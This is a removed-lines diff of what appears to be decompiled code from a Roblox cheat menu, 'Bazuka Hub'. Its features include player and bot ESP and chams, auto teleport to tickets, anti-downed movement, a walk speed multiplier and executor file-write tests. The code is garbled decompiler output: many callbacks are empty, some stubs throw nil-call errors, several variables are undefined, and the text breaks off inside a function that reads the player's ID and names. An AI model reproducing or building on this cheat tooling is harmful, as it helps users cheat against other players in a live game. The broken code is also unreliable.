-    local _389 = _388(255, 255, 255)
-    local _390 = Color3.fromRGB
-    local _391 = _390(255, 255, 255)
-    local _392 = Color3.fromRGB
-    local _393 = _392(255, 255, 255)
-    local _394 = Color3.fromRGB
-    local _395 = _394(255, 255, 255)
-    local _396 = Color3.fromRGB
-    local _397 = _396(255, 255, 255)
-    local _398 = Color3.fromRGB
-    local _399 = _398(255, 255, 255)
-    task.spawn(function(_401, _401_2, _401_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_404, _404_2, _404_3)
-    end)
-    task.spawn(function(_406, _406_2, _406_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_409, _409_2, _409_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _410 = _337.Notification
-    _410(_337, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _412 = _339.Button
-    local _413 = _412(_339, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _414 = _413.Section
-    local _415 = _414(_413, "GUI was made by Bazuka_ofcx", "Left")
-    local _416 = _415.Button
-    _416(_415, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_418, _418_2, _418_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _419 = _415.Button
-    _419(_415, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_421, _421_2, _421_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _422 = _413.Section
-    _422(_413, "Information:", "Left")
-    local _424 = _413.Section
-    _424(_413, "Last Update Changelog:", "Right")
-    local _426 = _341.Button
-    local _427 = _426(_341, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _428 = _427.Section
-    local _429 = _428(_427, "Automatism", "Left")
-    local _430 = _429.Toggle
-    _430(_429, {
-        Default = false,
-        Description = "Teleport you to Tickets",
-        Title = "Auto Ticket",
-    }, function(_432, _432_2, _432_3)
-    end)
-    local _433 = _429.Toggle
-    _433(_429, {
-        Default = false,
-        Description = "Respawn When You Downed",
-        Title = "Auto Respawn",
-    }, function(_435, _435_2, _435_3)
-    end)
-    local _436 = _429.Toggle
-    _436(_429, {
-        Default = false,
-        Description = "Automatically Whistle",
-        Title = "Auto Whistle",
-    }, function(_438, _438_2, _438_3)
-    end)
-    local _439 = _427.Section
-    local _440 = _439(_427, "Anti Downed", "Left")
-    local _441 = _440.Toggle
-    _441(_440, {
-        Default = false,
-        Description = "Let You Move When You Downed",
-        Title = "Enable",
-    }, function(_443, _443_2, _443_3)
-    end)
-    local _444 = _427.Section
-    local _445 = _444(_427, "NextBot Modifications", "Right")
-    local _446 = _445.Slider
-    _446(_445, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 0,
-        Description = "",
-    }, function(_448, _448_2, _448_3)
-        local _449, _449_2, _449_3 = math.floor(_448)
-        local _ = _449 / 100
-    end)
-    local _451 = _445.Toggle
-    _451(_445, {
-        Default = false,
-        Description = "",
-        Title = "Volume Changer",
-    }, function(_453, _453_2, _453_3)
-    end)
-    local _454 = _445.Slider
-    _454(_445, {
-        Min = 0,
-        Title = "Volume",
-        Max = 1000,
-        Default = 600,
-        Description = "",
-    }, function(_456, _456_2, _456_3)
-        local _457, _457_2, _457_3 = math.floor(_456)
-        local _ = _457 / 100
-    end)
-    local _459 = _427.Section
-    local _460 = _459(_427, "Spawn Info", "Right")
-    local _461 = _460.Toggle
-    _461(_460, {
-        Default = false,
-        Description = "Block some functions",
-        Title = "Enable",
-    }, function(_463, _463_2, _463_3)
-    end)
-    local _464 = _343.Button
-    local _465 = _464(_343, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _466 = _465.Section
-    local _467 = _466(_465, "Invisible Parts", "Left")
-    local _468 = _467.Slider
-    _468(_467, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 100,
-        Description = "",
-    }, function(_470, _470_2, _470_3)
-        local _471, _471_2, _471_3 = math.floor(_470)
-        local _ = _471 / 100
-    end)
-    type(_358)
-    local _ = _358.r
-    local _ = _358.g
-    local _ = _358.b
-    local _477 = _467.ColorPicker
-    local _478 = Color3.new
-    local _479 = _478()
-    _477(_467, {
-        Default = _479,
-        Description = "",
-        Title = "Color",
-    }, function(_481, _481_2, _481_3)
-    end)
-    local _482 = _467.Dropdown
-    _482(_467, {
-        Title = "Material",
-        Default = "ForceField",
-        Multi = false,
-        Options = {
-            Rubber = false,
-            ForceField = false,
-            ClayRoofTiles = false,
-            CeramicTiles = false,
-            Sandstone = false,
-            DiamondPlate = false,
-            Cobblestone = false,
-            Plaster = false,
-            Slate = false,
-            Granite = false,
-            Plastic = false,
-            RoofShingles = false,
-            CrackedLava = false,
-            LeafyGrass = false,
-            Glass = false,
-            Neon = false,
-            Sand = false,
-            Carpet = false,
-            WoodPlanks = false,
-            Wood = false,
-            Salt = false,
-            Marble = false,
-            CorrodedMetal = false,
-            Glacier = false,
-            SmoothPlastic = false,
-            Ground = false,
-            Snow = false,
-            Rock = false,
-            Grass = false,
-            Basalt = false,
-            Pavement = false,
-            Brick = false,
-            Mud = false,
-            Limestone = false,
-            Metal = false,
-            Leather = false,
-            Ice = false,
-            Foil = false,
-            Fabric = false,
-            Concrete = false,
-            Pebble = false,
-            Asphalt = false,
-            Cardboard = false,
-        },
-        Description = "Choose one of them",
-    }, function(_484, _484_2, _484_3)
-        for _485, _485_2 in _484 do
-        end
-    end)
-    local _486 = _465.Section
-    local _487 = _486(_465, "Viewmodel", "Left")
-    local _488 = _487.Slider
-    _488(_487, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 0,
-        Description = "",
-    }, function(_490, _490_2, _490_3)
-        local _491, _491_2, _491_3 = math.floor(_490)
-        local _ = _491 / 100
-    end)
-    type(_365)
-    local _ = _365.r
-    local _ = _365.g
-    local _ = _365.b
-    local _497 = _487.ColorPicker
-    local _498 = Color3.new
-    local _499 = _498()
-    _497(_487, {
-        Default = _499,
-        Description = "",
-        Title = "Color",
-    }, function(_501, _501_2, _501_3)
-    end)
-    local _502 = _487.Dropdown
-    _502(_487, {
-        Title = "Material",
-        Default = "Plastic",
-        Multi = false,
-        Options = {
-            Rubber = false,
-            ForceField = false,
-            ClayRoofTiles = false,
-            CeramicTiles = false,
-            Sandstone = false,
-            DiamondPlate = false,
-            Cobblestone = false,
-            Plaster = false,
-            Slate = false,
-            Granite = false,
-            Plastic = false,
-            RoofShingles = false,
-            CrackedLava = false,
-            LeafyGrass = false,
-            Glass = false,
-            Neon = false,
-            Sand = false,
-            Carpet = false,
-            WoodPlanks = false,
-            Wood = false,
-            Salt = false,
-            Marble = false,
-            CorrodedMetal = false,
-            Glacier = false,
-            SmoothPlastic = false,
-            Ground = false,
-            Snow = false,
-            Rock = false,
-            Grass = false,
-            Basalt = false,
-            Pavement = false,
-            Brick = false,
-            Mud = false,
-            Limestone = false,
-            Metal = false,
-            Leather = false,
-            Ice = false,
-            Foil = false,
-            Fabric = false,
-            Concrete = false,
-            Pebble = false,
-            Asphalt = false,
-            Cardboard = false,
-        },
-        Description = "Choose one of them",
-    }, function(_504, _504_2, _504_3)
-        for _505, _505_2 in _504 do
-        end
-    end)
-    local _506 = _465.Section
-    local _507 = _506(_465, "Body", "Left")
-    local _508 = _507.Slider
-    _508(_507, {
-        Min = 0,
-        Title = "Transparency",
-        Max = 100,
-        Default = 0,
-        Description = "",
-    }, function(_510, _510_2, _510_3)
-        local _511, _511_2, _511_3 = math.floor(_510)
-        local _ = _511 / 100
-    end)
-    type(_383)
-    local _ = _383.r
-    local _ = _383.g
-    local _ = _383.b
-    local _517 = _507.ColorPicker
-    local _518 = Color3.new
-    local _519 = _518()
-    _517(_507, {
-        Default = _519,
-        Description = "",
-        Title = "Color",
-    }, function(_521, _521_2, _521_3)
-    end)
-    local _522 = _507.Dropdown
-    _522(_507, {
-        Title = "Material",
-        Default = "Neon",
-        Multi = false,
-        Options = {
-            Rubber = false,
-            ForceField = false,
-            ClayRoofTiles = false,
-            CeramicTiles = false,
-            Sandstone = false,
-            DiamondPlate = false,
-            Cobblestone = false,
-            Plaster = false,
-            Slate = false,
-            Granite = false,
-            Plastic = false,
-            RoofShingles = false,
-            CrackedLava = false,
-            LeafyGrass = false,
-            Glass = false,
-            Neon = false,
-            Sand = false,
-            Carpet = false,
-            WoodPlanks = false,
-            Wood = false,
-            Salt = false,
-            Marble = false,
-            CorrodedMetal = false,
-            Glacier = false,
-            SmoothPlastic = false,
-            Ground = false,
-            Snow = false,
-            Rock = false,
-            Grass = false,
-            Basalt = false,
-            Pavement = false,
-            Brick = false,
-            Mud = false,
-            Limestone = false,
-            Metal = false,
-            Leather = false,
-            Ice = false,
-            Foil = false,
-            Fabric = false,
-            Concrete = false,
-            Pebble = false,
-            Asphalt = false,
-            Cardboard = false,
-        },
-        Description = "Choose one of them",
-    }, function(_524, _524_2, _524_3)
-        for _525, _525_2 in _524 do
-        end
-    end)
-    local _526 = _465.Section
-    local _527 = _526(_465, "Custom Time", "Left")
-    local _528 = _527.Toggle
-    _528(_527, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_530, _530_2, _530_3)
-    end)
-    local _531 = _527.Slider
-    _531(_527, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_533, _533_2, _533_3)
-        math.floor(_533)
-    end)
-    local _535 = _527.Slider
-    _535(_527, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_537, _537_2, _537_3)
-        math.floor(_537)
-    end)
-    local _539 = _465.Section
-    local _540 = _539(_465, "Game Weather", "Right")
-    local _541 = _540.Toggle
-    _541(_540, {
-        Default = false,
-        Description = "",
-        Title = "Fog",
-    }, function(_543, _543_2, _543_3)
-    end)
-    type(_367)
-    local _ = _367.r
-    local _ = _367.g
-    local _ = _367.b
-    local _548 = _540.ColorPicker
-    local _549 = Color3.new
-    local _550 = _549()
-    _548(_540, {
-        Default = _550,
-        Description = "",
-        Title = "Color â„–1",
-    }, function(_552, _552_2, _552_3)
-    end)
-    type(_369)
-    local _ = _369.r
-    local _ = _369.g
-    local _ = _369.b
-    local _557 = _540.ColorPicker
-    local _558 = Color3.new
-    local _559 = _558()
-    _557(_540, {
-        Default = _559,
-        Description = "",
-        Title = "Color â„–2",
-    }, function(_561, _561_2, _561_3)
-    end)
-    local _562 = _540.Toggle
-    _562(_540, {
-        Default = false,
-        Description = "",
-        Title = "Rain",
-    }, function(_564, _564_2, _564_3)
-    end)
-    type(_375)
-    local _ = _375.r
-    local _ = _375.g
-    local _ = _375.b
-    local _569 = _540.ColorPicker
-    local _570 = Color3.new
-    local _571 = _570()
-    _569(_540, {
-        Default = _571,
-        Description = "",
-        Title = "Color â„–1",
-    }, function(_573, _573_2, _573_3)
-    end)
-    type(_377)
-    local _ = _377.r
-    local _ = _377.g
-    local _ = _377.b
-    local _578 = _540.ColorPicker
-    local _579 = Color3.new
-    local _580 = _579()
-    _578(_540, {
-        Default = _580,
-        Description = "",
-        Title = "Color â„–2",
-    }, function(_582, _582_2, _582_3)
-    end)
-    local _583 = _540.Toggle
-    _583(_540, {
-        Default = false,
-        Description = "",
-        Title = "Thunderstorm",
-    }, function(_585, _585_2, _585_3)
-    end)
-    type(_371)
-    local _ = _371.r
-    local _ = _371.g
-    local _ = _371.b
-    local _590 = _540.ColorPicker
-    local _591 = Color3.new
-    local _592 = _591()
-    _590(_540, {
-        Default = _592,
-        Description = "",
-        Title = "Color â„–1",
-    }, function(_594, _594_2, _594_3)
-    end)
-    type(_373)
-    local _ = _373.r
-    local _ = _373.g
-    local _ = _373.b
-    local _599 = _540.ColorPicker
-    local _600 = Color3.new
-    local _601 = _600()
-    _599(_540, {
-        Default = _601,
-        Description = "",
-        Title = "Color â„–2",
-    }, function(_603, _603_2, _603_3)
-    end)
-    local _604 = _540.Toggle
-    _604(_540, {
-        Default = false,
-        Description = "",
-        Title = "Snow",
-    }, function(_606, _606_2, _606_3)
-    end)
-    type(_379)
-    local _ = _379.r
-    local _ = _379.g
-    local _ = _379.b
-    local _611 = _540.ColorPicker
-    local _612 = Color3.new
-    local _613 = _612()
-    _611(_540, {
-        Default = _613,
-        Description = "",
-        Title = "Color â„–1",
-    }, function(_615, _615_2, _615_3)
-    end)
-    type(_381)
-    local _ = _381.r
-    local _ = _381.g
-    local _ = _381.b
-    local _620 = _540.ColorPicker
-    local _621 = Color3.new
-    local _622 = _621()
-    _620(_540, {
-        Default = _622,
-        Description = "",
-        Title = "Color â„–2",
-    }, function(_624, _624_2, _624_3)
-    end)
-    local _625 = _465.Section
-    local _626 = _625(_465, "Weather Disables", "Right")
-    local _627 = _626.Dropdown
-    _627(_626, {
-        Title = "Weather",
-        Default = "None",
-        Multi = true,
-        Options = {
-            Snow = false,
-            Rain = false,
-            Thunerstorm = false,
-            Fog = false,
-        },
-        Description = "Choose one of them",
-    }, function(_629, _629_2, _629_3)
-        local _ = _629.Fog
-        local _ = _629.Rain
-        local _ = _629.Thunerstorm
-        local _ = _629.Snow
-    end)
-    local _634 = _465.Section
-    local _635 = _634(_465, "Custom Fog", "Right")
-    local _636 = _635.Toggle
-    _636(_635, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_638, _638_2, _638_3)
-    end)
-    local _639 = _635.Slider
-    _639(_635, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_641, _641_2, _641_3)
-        math.floor(_641)
-    end)
-    local _643 = _635.Slider
-    _643(_635, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_645, _645_2, _645_3)
-        math.floor(_645)
-    end)
-    type(_361)
-    local _ = _361.r
-    local _ = _361.g
-    local _ = _361.b
-    local _651 = _635.ColorPicker
-    local _652 = Color3.new
-    local _653 = _652()
-    _651(_635, {
-        Default = _653,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_655, _655_2, _655_3)
-    end)
-    local _656 = _343.Button
-    local _657 = _656(_343, "People Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _658 = _657.Section
-    local _659 = _658(_657, "Chams", "Left")
-    local _660 = _659.Toggle
-    _660(_659, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_662, _662_2, _662_3)
-    end)
-    local _663 = _659.Slider
-    _663(_659, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_665, _665_2, _665_3)
-        local _666, _666_2, _666_3 = math.floor(_665)
-        local _ = _666 / 100
-    end)
-    type(_393)
-    local _ = _393.r
-    local _ = _393.g
-    local _ = _393.b
-    local _672 = _659.ColorPicker
-    local _673 = Color3.new
-    local _674 = _673()
-    _672(_659, {
-        Default = _674,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_676, _676_2, _676_3)
-    end)
-    local _677 = _659.Slider
-    _677(_659, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_679, _679_2, _679_3)
-        local _680, _680_2, _680_3 = math.floor(_679)
-        local _ = _680 / 100
-    end)
-    type(_395)
-    local _ = _395.r
-    local _ = _395.g
-    local _ = _395.b
-    local _686 = _659.ColorPicker
-    local _687 = Color3.new
-    local _688 = _687()
-    _686(_659, {
-        Default = _688,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_690, _690_2, _690_3)
-    end)
-    local _691 = _657.Section
-    local _692 = _691(_657, "ESP", "Right")
-    local _693 = _692.Toggle
-    _693(_692, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_695, _695_2, _695_3)
-    end)
-    local _696 = _692.Slider
-    _696(_692, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = 50,
-        Description = "",
-    }, function(_698, _698_2, _698_3)
-        local _699, _699_2, _699_3 = math.floor(_698)
-        local _ = _699 / 100
-    end)
-    local _701 = _692.Toggle
-    _701(_692, {
-        Default = true,
-        Description = "",
-        Title = "Outline",
-    }, function(_703, _703_2, _703_3)
-    end)
-    local _704 = _692.Toggle
-    _704(_692, {
-        Default = false,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_706, _706_2, _706_3)
-    end)
-    local _707 = _692.Toggle
-    _707(_692, {
-        Default = false,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_709, _709_2, _709_3)
-    end)
-    local _710 = _692.Toggle
-    _710(_692, {
-        Default = false,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_712, _712_2, _712_3)
-    end)
-    local _713 = _692.Slider
-    _713(_692, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = 8,
-        Description = "",
-    }, function(_715, _715_2, _715_3)
-        math.floor(_715)
-    end)
-    type(_399)
-    local _ = _399.r
-    local _ = _399.g
-    local _ = _399.b
-    local _721 = _692.ColorPicker
-    local _722 = Color3.new
-    local _723 = _722()
-    _721(_692, {
-        Default = _723,
-        Description = "",
-        Title = "Text Color",
-    }, function(_725, _725_2, _725_3)
-    end)
-    local _726 = _343.Button
-    local _727 = _726(_343, "Bot Chams & ESP", "http://www.roblox.com/asset/?id=12120698352")
-    local _728 = _727.Section
-    local _729 = _728(_727, "Chams", "Left")
-    local _730 = _729.Toggle
-    _730(_729, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_732, _732_2, _732_3)
-    end)
-    local _733 = _729.Slider
-    _733(_729, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_735, _735_2, _735_3)
-        local _736, _736_2, _736_3 = math.floor(_735)
-        local _ = _736 / 100
-    end)
-    type(_389)
-    local _ = _389.r
-    local _ = _389.g
-    local _ = _389.b
-    local _742 = _729.ColorPicker
-    local _743 = Color3.new
-    local _744 = _743()
-    _742(_729, {
-        Default = _744,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_746, _746_2, _746_3)
-    end)
-    local _747 = _729.Slider
-    _747(_729, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_749, _749_2, _749_3)
-        local _750, _750_2, _750_3 = math.floor(_749)
-        local _ = _750 / 100
-    end)
-    type(_391)
-    local _ = _391.r
-    local _ = _391.g
-    local _ = _391.b
-    local _756 = _729.ColorPicker
-    local _757 = Color3.new
-    local _758 = _757()
-    _756(_729, {
-        Default = _758,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_760, _760_2, _760_3)
-    end)
-    local _761 = _727.Section
-    local _762 = _761(_727, "ESP", "Right")
-    local _763 = _762.Toggle
-    _763(_762, {
-        Default = _695,
-        Description = "",
-        Title = "Enable",
-    }, function(_765, _765_2, _765_3)
-    end)
-    local _766 = _762.Slider
-    local _767 = _700 * 100
-    _766(_762, {
-        Min = 0,
-        Title = "ESP Offset",
-        Max = 100,
-        Default = _767,
-        Description = "",
-    }, function(_769, _769_2, _769_3)
-        local _770, _770_2, _770_3 = math.floor(_769)
-        local _ = _770 / 100
-    end)
-    local _772 = _762.Toggle
-    _772(_762, {
-        Default = _703,
-        Description = "",
-        Title = "Outline",
-    }, function(_774, _774_2, _774_3)
-    end)
-    local _775 = _762.Toggle
-    _775(_762, {
-        Default = _706,
-        Description = "",
-        Title = "Name ESP",
-    }, function(_777, _777_2, _777_3)
-    end)
-    local _778 = _762.Toggle
-    _778(_762, {
-        Default = _709,
-        Description = "",
-        Title = "Health ESP",
-    }, function(_780, _780_2, _780_3)
-    end)
-    local _781 = _762.Toggle
-    _781(_762, {
-        Default = _712,
-        Description = "",
-        Title = "Distance ESP",
-    }, function(_783, _783_2, _783_3)
-    end)
-    local _784 = _762.Slider
-    _784(_762, {
-        Min = 0,
-        Title = "Text Size",
-        Max = 100,
-        Default = _716,
-        Description = "",
-    }, function(_786, _786_2, _786_3)
-        math.floor(_786)
-    end)
-    type(_397)
-    local _ = _397.r
-    local _ = _397.g
-    local _ = _397.b
-    local _792 = _762.ColorPicker
-    local _793 = Color3.new
-    local _794 = _793()
-    _792(_762, {
-        Default = _794,
-        Description = "",
-        Title = "Text Color",
-    }, function(_796, _796_2, _796_3)
-    end)
-    local _797 = _343.Button
-    local _798 = _797(_343, "Objective Chams", "http://www.roblox.com/asset/?id=12120698352")
-    local _799 = _798.Section
-    local _800 = _799(_798, "Chams", "Left")
-    local _801 = _800.Toggle
-    _801(_800, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_803, _803_2, _803_3)
-    end)
-    local _804 = _800.Slider
-    _804(_800, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_806, _806_2, _806_3)
-        local _807, _807_2, _807_3 = math.floor(_806)
-        local _ = _807 / 100
-    end)
-    type(_385)
-    local _ = _385.r
-    local _ = _385.g
-    local _ = _385.b
-    local _813 = _800.ColorPicker
-    local _814 = Color3.new
-    local _815 = _814()
-    _813(_800, {
-        Default = _815,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_817, _817_2, _817_3)
-    end)
-    local _818 = _800.Slider
-    _818(_800, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_820, _820_2, _820_3)
-        local _821, _821_2, _821_3 = math.floor(_820)
-        local _ = _821 / 100
-    end)
-    type(_387)
-    local _ = _387.r
-    local _ = _387.g
-    local _ = _387.b
-    local _827 = _800.ColorPicker
-    local _828 = Color3.new
-    local _829 = _828()
-    _827(_800, {
-        Default = _829,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_831, _831_2, _831_3)
-    end)
-    local _832 = _345.Button
-    local _833 = _832(_345, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _834 = _833.Section
-    local _835 = _834(_833, "Character Actions", "Left")
-    local _836 = _835.Button
-    _836(_835, {
-        ButtonName = "Reset",
-        Title = "Reset",
-        Description = "",
-    }, function(_838, _838_2, _838_3)
-        local _839 = game.Players.LocalPlayer
-        local _840 = _839.PlayerScripts
-        local _841 = _840.Events
-        local _842 = _841.Reset
-        local _843 = _842.FireServer
-        _843(_842)
-    end)
-    local _845 = _835.Button
-    _845(_835, {
-        ButtonName = "Respawn",
-        Title = "Respawn",
-        Description = "",
-    }, function(_847, _847_2, _847_3)
-        local _ReplicatedStorage848 = game:GetService("ReplicatedStorage")
-        local _849 = _ReplicatedStorage848.Events
-        local _850 = _849.Data
-        local _851 = _850.GetLives
-        local _852 = _851.FireServer
-        _852(_851)
-        local _ReplicatedStorage854 = game:GetService("ReplicatedStorage")
-        local _855 = _ReplicatedStorage854.Events
-        local _856 = _855.Player
-        local _857 = _856.ChangePlayerMode
-        local _858 = _857.FireServer
-        _858(_857, true)
-    end)
-    local _860 = _835.Button
-    _860(_835, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_862, _862_2, _862_3)
-        local _TeleportService863 = game:GetService("TeleportService")
-        local _864 = _TeleportService863.Teleport
-        local _Players865 = game:GetService("Players")
-        local _866 = _Players865.LocalPlayer
-        _864(_TeleportService863, game.PlaceId, _866)
-    end)
-    local _868 = _833.Section
-    local _869 = _868(_833, "Walk Speed Multiplier", "Right")
-    local _870 = _869.Toggle
-    _870(_869, {
-        Default = _285,
-        Description = "Improve Your Walk Speed",
-        Title = "Speed Multiplier",
-    }, function(_872, _872_2, _872_3)
-    end)
-    local _873 = _869.Slider
-    _873(_869, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 20,
-        Default = _289,
-        Description = "",
-    }, function(_875, _875_2, _875_3)
-        math.floor(_875)
-    end)
-    local _877 = Instance.new
-    local _878 = _877("ScreenGui", game.CoreGui)
-    local _879 = Instance.new
-    local _880 = _879("TextButton")
-    _880.BackgroundTransparency = 1
-    local _881 = UDim2.new
-    local _882 = _881(0, 0, 0, 0)
-    _880.Size = _882
-    _880.Text = " "
-    _880.Parent = _878
-    local _883 = Instance.new
-    local _884 = _883("ScreenGui", game.CoreGui)
-    _884.Name = "BackgroundScreenGui"
-    _884.Enabled = true
-    local _885 = Instance.new
-    local _886 = _885("TextLabel", _884)
-    _886.Name = "BackgroundLabel"
-    local _887 = Instance.new
-    local _888 = _887("UIGradient", _886)
-    _888.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _935
-fenv.backgroundgradientcolor2 = _937
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.customguicolor = _939
-fenv.customshadowcolor = _941
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.synchronizationstatus = false
-fenv.synchrohitted = false
-fenv.originaltime = _942
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.fullbrightstatus = false
-fenv.levelofbrightness = 0
-fenv.crop = false
-fenv.fov = 80
-fenv.fovstatus = false
-fenv.originalfogcolor = _943
-fenv.customfogcolor = _945
-fenv.originalfogend = _946
-fenv.customfogend = 1000
-fenv.originalfogstart = _947
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.viewmodelcolor = _949
-fenv.viewmodelparts = 0
-fenv.viewmodelmaterial = "Plastic"
-fenv.weaponcolor = _951
-fenv.weaponparts = 0
-fenv.weaponmaterial = "Plastic"
-fenv.enemieschamsstatus = false
-fenv.enemieschamsoutlinecolora = _953
-fenv.enemieschamsfillingcolora = _955
-fenv.enemieschamsoutlinetransparencya = 0
-fenv.enemieschamsfillingtransparencya = 0.9
-fenv.allieschamsstatus = false
-fenv.allieschamsoutlinecolora = _957
-fenv.allieschamsfillingcolora = _959
-fenv.allieschamsoutlinetransparencya = 0
-fenv.allieschamsfillingtransparencya = 0.9
-fenv.enemiesespstatus = false
-fenv.enemiesnameespstatus = false
-fenv.enemieshealthespstatus = false
-fenv.enemiesdistanceespstatus = false
-fenv.enemiesenabledoutline = true
-fenv.enemiestextsizenamea = 8
-fenv.enemiesnameespcolora = _961
-fenv.enemiesespoffseta = 0.5
-fenv.enemiesfontnameesp = "Montserrat"
-fenv.alliesespstatus = false
-fenv.alliesnameespstatus = false
-fenv.allieshealthespstatus = false
-fenv.alliesdistanceespstatus = false
-fenv.alliesenabledoutline = true
-fenv.alliestextsizenamea = 8
-fenv.alliesnameespcolora = _963
-fenv.alliesespoffseta = 0.5
-fenv.alliesfontnameesp = "Montserrat"
-fenv.invisiblemode = false
-fenv.healtarget = _965
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.invisiblemode = _998
-fenv.changetimestatus = _1062
-fenv.hours = _1066
-fenv.minutes = _1070
-fenv.changefogstatus = _1075
-fenv.customfogend = _1079
-fenv.customfogstart = _1083
-fenv.b = _1087
-fenv.g = _1086
-fenv.r = _1085
-fenv.customfogcolor = _1092
-fenv.crop = _1097
-fenv.fullbrightstatus = _1100
-fenv.levelofbrightness = _1104
-fenv.fovstatus = _1107
-fenv.fov = _1111
-fenv.viewmodelparts = _1120
-fenv.b = _1124
-fenv.g = _1123
-fenv.r = _1122
-fenv.viewmodelcolor = _1129
-fenv.viewmodelmaterial = _1133
-fenv.weaponparts = _1140
-fenv.b = _1144
-fenv.g = _1143
-fenv.r = _1142
-fenv.weaponcolor = _1149
-fenv.weaponmaterial = _1153
-fenv.enemieschamsstatus = _1160
-fenv.enemieschamsoutlinetransparencya = _1165
-fenv.b = _1169
-fenv.g = _1168
-fenv.r = _1167
-fenv.enemieschamsoutlinecolora = _1174
-fenv.enemieschamsfillingtransparencya = _1179
-fenv.b = _1183
-fenv.g = _1182
-fenv.r = _1181
-fenv.enemieschamsfillingcolora = _1188
-fenv.enemiesespstatus = _1193
-fenv.enemiesespoffseta = _1198
-fenv.enemiesenabledoutline = _1201
-fenv.enemiesnameespstatus = _1204
-fenv.enemieshealthespstatus = _1207
-fenv.enemiesdistanceespstatus = _1210
-fenv.enemiestextsizenamea = _1214
-fenv.b = _1218
-fenv.g = _1217
-fenv.r = _1216
-fenv.enemiesnameespcolora = _1223
-fenv.allieschamsstatus = _1230
-fenv.allieschamsoutlinetransparencya = _1235
-fenv.b = _1239
-fenv.g = _1238
-fenv.r = _1237
-fenv.allieschamsoutlinecolora = _1244
-fenv.allieschamsfillingtransparencya = _1249
-fenv.b = _1253
-fenv.g = _1252
-fenv.r = _1251
-fenv.allieschamsfillingcolora = _1258
-fenv.alliesespstatus = _1263
-fenv.alliesespoffseta = _1268
-fenv.alliesenabledoutline = _1271
-fenv.alliesnameespstatus = _1274
-fenv.allieshealthespstatus = _1277
-fenv.alliesdistanceespstatus = _1280
-fenv.alliestextsizenamea = _1284
-fenv.b = _1288
-fenv.g = _1287
-fenv.r = _1286
-fenv.alliesnameespcolora = _1293
-fenv.fireteam = function(_890, _890_2, _890_3)
-    local _891 = game.Players.LocalPlayer
-    local _892 = _891.UserId
-    local _893 = game.Players.LocalPlayer
-    local _894 = _893.DisplayName
-    local _895 = game.Players.LocalPlayer
-    local _896 = _895.Name
